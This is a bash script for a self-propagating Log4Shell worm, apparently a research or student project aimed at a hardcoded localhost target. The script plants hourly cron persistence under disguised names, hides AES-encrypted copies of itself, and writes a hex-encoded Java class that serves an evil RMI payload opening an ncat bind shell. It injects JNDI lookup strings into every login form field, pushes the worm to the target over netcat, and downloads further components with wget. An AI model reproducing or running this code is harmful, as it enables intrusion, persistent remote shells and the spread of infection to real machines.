#!/bin/bash

# Check if the machine has already been infected

IP_TARGET="localhost:8081" # CURRENTLY HARDCODED
IP_TARGET_LOGIN="localhost:8081/login" # CURRENTLY HARDCODED

USER=`whoami`
FILENAME=".dbus-update-errors"
FILESYSTEM_FILE="$HOME/$FILENAME"

MSG="dbus-update-activation-environment: setting DISPLAY=:0 \n
dbus-update-activation-environment: setting XAUTHORITY=/home/$USER/.Xauthority \n
dbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n
dbus-update-activation-environment: setting SHELL=/bin/bash \n
dbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n
dbus-update-activation-environment: setting XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0 \n
dbus-update-activation-environment: setting PWD=`pwd` \n
dbus-update-activation-environment: setting GDM_LANG=en_US \n
dbus-update-activation-environment: setting HOME=$HOME \n
dbus-update-activation-environment: setting IM_CONFIG_PHASE=1 \n
dbus-update-activation-environment: setting LANG=en_US.UTF-8 \n
dbus-update-activation-environment: setting LC_PAPER=en_US.UTF-8 \n
dbus-update-activation-environment: setting LC_NUMERIC=en_US.UTF-8 \n
dbus-update-activation-environment: setting _=/usr/bin/dbus-update-activation-environment \n"

# File requirements:
# 	REAL_SCRIPT: it's the master script that actually exploits log4shell (aka Master script)
# 	INFECTION: it's literally this script
# 	JAVA_RMI_SERVER: it's the RMI server (.class and .jar files)

mkdir $HOME/.cache.old

REAL_SCRIPT_NAME=".ssh_host"
REAL_SCRIPT_LOCATION="$HOME/$REAL_SCRIPT_NAME"
DECRYPTED_SCRIPT_LOCATION="$HOME/.aux"
INFECTION_NAME=".wget-hosts" # Real file name: .wget-hsts
INFECTION_LOCATION="$HOME/$INFECTION_NAME"
DECRYPTED_INFECTION_LOCATION="$HOME/.auxiliar"
DECRYPTED_INFECTION_LOCATION_DECODED="$HOME/.auxiliar_dec"
JAVA_RMI_SERVER_LOCATION="$HOME/.cache.old"

OUTPUT_LOGS="/tmp/log.XX" # TODO: move it to /dev/null in production
OUTPUT_LOGS2="/tmp/log.XX2" # TODO: move it to /dev/null in production

KEY=6b62ea5c42421acb43a770a77164619e398910df884ccb0d4a57ba91dfc18d48
IV=$(cat /etc/machine-id | md5sum | cut -d ' ' -f 1 | head -c 16)

CRON_SCRIPT_CONTENT="#!/bin/bash \n
cat $REAL_SCRIPT_LOCATION | openssl enc -aes-256-cbc -K $KEY -iv $IV -d > $DECRYPTED_SCRIPT_LOCATION 2> /dev/null \n
chmod +x $DECRYPTED_SCRIPT_LOCATION \n
cat $INFECTION_LOCATION | openssl enc -aes-256-cbc -K $KEY -iv $IV -d > $DECRYPTED_INFECTION_LOCATION 2> /dev/null \n
cat $DECRYPTED_INFECTION_LOCATION | base64 -di > $DECRYPTED_INFECTION_LOCATION_DECODED \n
chmod +x $DECRYPTED_INFECTION_LOCATION_DECODED \n
export JAVA_RMI_SERVER_LOCATION=$JAVA_RMI_SERVER_LOCATION \n
$DECRYPTED_SCRIPT_LOCATION $IP_TARGET $IP_TARGET_LOGIN $DECRYPTED_INFECTION_LOCATION_DECODED $ATTACKER_IP > $OUTPUT_LOGS2 2>&1 \n
rm $DECRYPTED_SCRIPT_LOCATION $DECRYPTED_INFECTION_LOCATION $DECRYPTED_INFECTION_LOCATION_DECODED \n
ncat localhost 4242 -e /bin/bash &>/dev/null & disown" # 2> &1 moves stderr to stdout

# $ATTACKER_IP is defined before calling this script.

if [ ! -f "$FILESYSTEM_FILE" ]; then
	echo -e $MSG > $FILESYSTEM_FILE # Use touch to modify the dates?
else
	exit
fi


# We only proceed if it hasn't been infected

if [ $USER == "root" ] && [ -d "/etc/cron.hourly" ]; then # Write in /etc/cron.hourly
	SCRIPT_NAME="man-db" # Careful with name, otherwise it won't be run by cron
	SCRIPT_PATH="/etc/cron.hourly/$SCRIPT_NAME"
	echo -e $CRON_SCRIPT_CONTENT > $SCRIPT_PATH
	chmod +x $SCRIPT_PATH
else # Create an entry in crontab
	SCRIPT_NAME="syslog"
	SCRIPT_PATH="$HOME/$SCRIPT_NAME"	
	echo -e $CRON_SCRIPT_CONTENT > $SCRIPT_PATH
	chmod +x $SCRIPT_PATH
	EDITOR="vi"
	(crontab -l | echo -e "0 * * * * $SCRIPT_PATH") | crontab -
fi


MASTER_SCRIPT='#!/bin/bash \nLOGIN_PAGE=$1 \nTARGET_URL=$2 \nSCRIPT=$3 \nATTACKER_IP=$4 \nlist=`curl $LOGIN_PAGE | awk "/<input/,/>/" | grep -Po "name=\"\K[^\"]*"` \nmalicious_user="%24%7Bjndi%3Armi%3A%2F%2F$ATTACKER_IP%3A1097%2FObject%7D" \nstr_req="" \nfor element in $list \ndo \nnew_field="${element}=$malicious_user" \nif [ ! -z "$str_req" ] \nthen \nstr_req="${str_req}&" \nfi \nstr_req="${str_req}${new_field}" \ndone \ncd $JAVA_RMI_SERVER_LOCATION ; /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -cp tomcat-catalina-8.5.83.jar:. File & \nJAVA_PID=$! \nsleep 4 \ncurl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d $str_req $TARGET_URL \nnc_exit_code=1 \niterations=0 \nTARGET_IP=$(echo -n $(echo -n "${LOGIN_PAGE#*://}") | cut -d ':' -f 1 | rev | cut -d '/' -f 1 | rev) \nwhile [ "$nc_exit_code" -ne 0 ] && [ $iterations -lt 20 ]; do \nsleep 4 \nif [ "`readlink /etc/alternatives/nc`" == "/bin/nc.openbsd" ]; then \necho "ATTACKER_IP=$TARGET_IP;" | cat - $SCRIPT | nc -q 0 $TARGET_IP 6969 \nelse \necho "ATTACKER_IP=$TARGET_IP;" | cat - $SCRIPT | nc $TARGET_IP 6969 \nfi \nnc_exit_code=$? \niterations=$((iterations + 1)) \ndone \nkill -kill $JAVA_PID \n'

echo -ne $MASTER_SCRIPT | openssl enc -aes-256-cbc -K $KEY -iv $IV -out $REAL_SCRIPT_LOCATION

echo -ne "\xca\xfe\xba\xbe\x00\x00\x00\x37\x00\x4f\x0a\x00\x17\x00\x22\x09\x00\x23\x00\x24\x08\x00\x25\x0a\x00\x26\x00\x27\x0a\x00\x28\x00\x29\x07\x00\x2a\x08\x00\x2b\x08\x00\x2c\x08\x00\x2d\x0a\x00\x06\x00\x2e\x07\x00\x2f\x08\x00\x30\x08\x00\x31\x0a\x00\x0b\x00\x32\x0a\x00\x06\x00\x33\x08\x00\x34\x08\x00\x35\x07\x00\x36\x0a\x00\x12\x00\x37\x08\x00\x38\x0b\x00\x39\x00\x3a\x07\x00\x3b\x07\x00\x3c\x01\x00\x06\x3c\x69\x6e\x69\x74\x3e\x01\x00\x03\x28\x29\x56\x01\x00\x04\x43\x6f\x64\x65\x01\x00\x0f\x4c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x54\x61\x62\x6c\x65\x01\x00\x04\x6d\x61\x69\x6e\x01\x00\x16\x28\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x0a\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x07\x00\x3d\x01\x00\x0a\x53\x6f\x75\x72\x63\x65\x46\x69\x6c\x65\x01\x00\x09\x46\x69\x6c\x65\x2e\x6a\x61\x76\x61\x0c\x00\x18\x00\x19\x07\x00\x3e\x0c\x00\x3f\x00\x40\x01\x00\x27\x43\x72\x65\x61\x74\x69\x6e\x67\x20\x65\x76\x69\x6c\x20\x52\x4d\x49\x20\x72\x65\x67\x69\x73\x74\x72\x79\x20\x6f\x6e\x20\x70\x6f\x72\x74\x20\x31\x30\x39\x37\x07\x00\x41\x0c\x00\x42\x00\x43\x07\x00\x44\x0c\x00\x45\x00\x46\x01\x00\x1d\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x6e\x61\x6d\x69\x6e\x67\x2f\x52\x65\x73\x6f\x75\x72\x63\x65\x52\x65\x66\x01\x00\x14\x6a\x61\x76\x61\x78\x2e\x65\x6c\x2e\x45\x4c\x50\x72\x6f\x63\x65\x73\x73\x6f\x72\x01\x00\x00\x01\x00\x25\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x6e\x61\x6d\x69\x6e\x67\x2e\x66\x61\x63\x74\x6f\x72\x79\x2e\x42\x65\x61\x6e\x46\x61\x63\x74\x6f\x72\x79\x0c\x00\x18\x00\x47\x01\x00\x1a\x6a\x61\x76\x61\x78\x2f\x6e\x61\x6d\x69\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x52\x65\x66\x41\x64\x64\x72\x01\x00\x0b\x66\x6f\x72\x63\x65\x53\x74\x72\x69\x6e\x67\x01\x00\x06\x78\x3d\x65\x76\x61\x6c\x0c\x00\x18\x00\x48\x0c\x00\x49\x00\x4a\x01\x00\x01\x78\x01\x00\xd9\x22\x22\x2e\x67\x65\x74\x43\x6c\x61\x73\x73\x28\x29\x2e\x66\x6f\x72\x4e\x61\x6d\x65\x28\x22\x6a\x61\x76\x61\x78\x2e\x73\x63\x72\x69\x70\x74\x2e\x53\x63\x72\x69\x70\x74\x45\x6e\x67\x69\x6e\x65\x4d\x61\x6e\x61\x67\x65\x72\x22\x29\x2e\x6e\x65\x77\x49\x6e\x73\x74\x61\x6e\x63\x65\x28\x29\x2e\x67\x65\x74\x45\x6e\x67\x69\x6e\x65\x42\x79\x4e\x61\x6d\x65\x28\x22\x4a\x61\x76\x61\x53\x63\x72\x69\x70\x74\x22\x29\x2e\x65\x76\x61\x6c\x28\x22\x6e\x65\x77\x20\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x50\x72\x6f\x63\x65\x73\x73\x42\x75\x69\x6c\x64\x65\x72\x5b\x27\x28\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x5b\x5d\x29\x27\x5d\x28\x5b\x27\x2f\x62\x69\x6e\x2f\x73\x68\x27\x2c\x27\x2d\x63\x27\x2c\x27\x6e\x63\x61\x74\x20\x2d\x6c\x70\x20\x36\x39\x36\x39\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x27\x5d\x29\x2e\x73\x74\x61\x72\x74\x28\x29\x22\x29\x01\x00\x2a\x63\x6f\x6d\x2f\x73\x75\x6e\x2f\x6a\x6e\x64\x69\x2f\x72\x6d\x69\x2f\x72\x65\x67\x69\x73\x74\x72\x79\x2f\x52\x65\x66\x65\x72\x65\x6e\x63\x65\x57\x72\x61\x70\x70\x65\x72\x0c\x00\x18\x00\x4b\x01\x00\x06\x4f\x62\x6a\x65\x63\x74\x07\x00\x4c\x0c\x00\x4d\x00\x4e\x01\x00\x04\x46\x69\x6c\x65\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x01\x00\x13\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x79\x73\x74\x65\x6d\x01\x00\x03\x6f\x75\x74\x01\x00\x15\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x53\x74\x72\x65\x61\x6d\x3b\x01\x00\x13\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x07\x70\x72\x69\x6e\x74\x6c\x6e\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x20\x6a\x61\x76\x61\x2f\x72\x6d\x69\x2f\x72\x65\x67\x69\x73\x74\x72\x79\x2f\x4c\x6f\x63\x61\x74\x65\x52\x65\x67\x69\x73\x74\x72\x79\x01\x00\x0e\x63\x72\x65\x61\x74\x65\x52\x65\x67\x69\x73\x74\x72\x79\x01\x00\x1f\x28\x49\x29\x4c\x6a\x61\x76\x61\x2f\x72\x6d\x69\x2f\x72\x65\x67\x69\x73\x74\x72\x79\x2f\x52\x65\x67\x69\x73\x74\x72\x79\x3b\x01\x00\x70\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5a\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x27\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x03\x61\x64\x64\x01\x00\x19\x28\x4c\x6a\x61\x76\x61\x78\x2f\x6e\x61\x6d\x69\x6e\x67\x2f\x52\x65\x66\x41\x64\x64\x72\x3b\x29\x56\x01\x00\x1b\x28\x4c\x6a\x61\x76\x61\x78\x2f\x6e\x61\x6d\x69\x6e\x67\x2f\x52\x65\x66\x65\x72\x65\x6e\x63\x65\x3b\x29\x56\x01\x00\x1a\x6a\x61\x76\x61\x2f\x72\x6d\x69\x2f\x72\x65\x67\x69\x73\x74\x72\x79\x2f\x52\x65\x67\x69\x73\x74\x72\x79\x01\x00\x04\x62\x69\x6e\x64\x01\x00\x26\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x6a\x61\x76\x61\x2f\x72\x6d\x69\x2f\x52\x65\x6d\x6f\x74\x65\x3b\x29\x56\x00\x21\x00\x16\x00\x17\x00\x00\x00\x00\x00\x02\x00\x01\x00\x18\x00\x19\x00\x01\x00\x1a\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05\x2a\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x1b\x00\x00\x00\x06\x00\x01\x00\x00\x00\x06\x00\x09\x00\x1c\x00\x1d\x00\x02\x00\x1a\x00\x00\x00\x87\x00\x09\x00\x04\x00\x00\x00\x53\xb2\x00\x02\x12\x03\xb6\x00\x04\x11\x04\x49\xb8\x00\x05\x4c\xbb\x00\x06\x59\x12\x07\x01\x12\x08\x12\x08\x04\x12\x09\x01\xb7\x00\x0a\x4d\x2c\xbb\x00\x0b\x59\x12\x0c\x12\x0d\xb7\x00\x0e\xb6\x00\x0f\x2c\xbb\x00\x0b\x59\x12\x10\x12\x11\xb7\x00\x0e\xb6\x00\x0f\xbb\x00\x12\x59\x2c\xb7\x00\x13\x4e\x2b\x12\x14\x2d\xb9\x00\x15\x03\x00\xb1\x00\x00\x00\x01\x00\x1b\x00\x00\x00\x22\x00\x08\x00\x00\x00\x08\x00\x08\x00\x09\x00\x0f\x00\x0c\x00\x22\x00\x0e\x00\x31\x00\x10\x00\x40\x00\x13\x00\x49\x00\x14\x00\x52\x00\x15\x00\x1e\x00\x00\x00\x04\x00\x01\x00\x1f\x00\x01\x00\x20\x00\x00\x00\x02\x00\x21" > $JAVA_RMI_SERVER_LOCATION/File.class


# wget -O $JAVA_RMI_SERVER_LOCATION/Attack.class "https://github.com/aviba2000/MALWARE_aux_filed/blob/master/Attack.class?raw=true" > $OUTPUT_LOGS 2>&1
wget -O $JAVA_RMI_SERVER_LOCATION/tomcat-catalina-8.5.83.jar "https://github.com/aviba2000/MALWARE_aux_filed/blob/master/tomcat-catalina-8.5.83.jar?raw=true" > $OUTPUT_LOGS 2>&1

# wget -O $INFECTION_LOCATION "https://github.com/aviba2000/MALWARE_aux_filed/blob/master/test_script_touch.sh?raw=true" > $OUTPUT_LOGS 2>&1
# chmod +x $INFECTION_LOCATION

INFECTION_LOCATION_aux="$HOME/aux"

wget -O $INFECTION_LOCATION_aux "https://github.com/aviba2000/MALWARE_aux_filed/blob/master/encoded?raw=true" > $OUTPUT_LOGS 2>&1
cat $INFECTION_LOCATION_aux | openssl enc -aes-256-cbc -K $KEY -iv $IV -out $INFECTION_LOCATION
rm $INFECTION_LOCATION_aux

